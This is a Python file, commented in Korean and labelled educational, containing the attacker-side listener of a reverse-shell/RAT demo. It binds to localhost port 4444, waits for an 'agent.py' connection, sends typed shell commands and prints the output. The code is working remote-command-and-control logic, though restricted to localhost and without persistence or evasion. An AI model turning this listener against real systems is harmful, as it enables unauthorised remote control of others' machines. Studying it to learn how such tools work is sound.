#!/usr/bin/env python3
"""
[교육용] 리버스 쉘 데모 - 공격자(Listener) 역할

⚠️ 이 코드는 RAT이 '어떻게 동작하는지' 개념을 이해하기 위한 것이다.
   - 오직 127.0.0.1(localhost) 에서만 동작하도록 묶여 있다.
   - 지속성/위장/회피 기능이 전혀 없다. 실제 악성코드가 아니다.
   - 타인의 시스템을 대상으로 사용하는 것은 불법이며, 절대 하지 말 것.

구조: agent.py 가 이쪽으로 접속(리버스 연결)하면, 여기서 입력한 명령을 보내고
      agent 가 실행한 결과를 받아 출력한다.
"""
import socket

HOST = "127.0.0.1"   # 고정: localhost 전용. 다른 주소로 바꾸지 말 것.
PORT = 4444

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    print(f"[listener] {HOST}:{PORT} 에서 대기 중... (agent 접속 기다림)")
    conn, addr = s.accept()
    print(f"[listener] 연결됨: {addr}")
    print("[listener] 명령 입력 (exit 입력 시 종료)")
    try:
        while True:
            cmd = input("shell> ").strip()
            if not cmd:
                continue
            conn.sendall(cmd.encode() + b"\n")
            if cmd == "exit":
                break
            data = conn.recv(65536)
            if not data:
                print("[listener] 연결 종료됨")
                break
            print(data.decode(errors="replace"), end="")
    finally:
        conn.close()
        s.close()

if __name__ == "__main__":
    main()
